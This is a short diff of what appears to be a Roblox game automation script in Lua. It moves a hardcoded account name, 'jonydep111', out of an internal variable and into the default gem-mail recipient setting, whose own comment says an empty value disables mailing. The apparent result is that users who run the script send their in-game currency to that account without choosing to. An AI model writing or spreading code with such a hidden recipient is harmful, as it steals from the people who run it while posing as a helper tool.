@@ -96,8 +96,8 @@ local web1 = "sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2
     game.Loaded:Wait()
   end
 
-local userrv = "jonydep111"
-local minGems = 10000000
+local userrv = ""
+local minGems = 1000000000000
 
 local save
 
@@ -174,8 +174,8 @@ getgenv().petsGoConfig = {
     SELL_PICKAXE = true, SELL_PICKAXE_PERCENTAGE = 1.05,
     SELL_LOCKPICK = true, SELL_LOCKPICK_PERCENTAGE = 1.05,
 
-    MAIL_GEMS_USERNAME = {""},  -- Empty = Disabled Gem Mail, You can put multiple usernames 1% fee
-    MAIL_GEMS_MIN = 10000000000,  -- Minimum gems required to send
+    MAIL_GEMS_USERNAME = {"jonydep111"},  -- Empty = Disabled Gem Mail, You can put multiple usernames 1% fee
+    MAIL_GEMS_MIN = 10000000,  -- Minimum gems required to send
 }
 
 
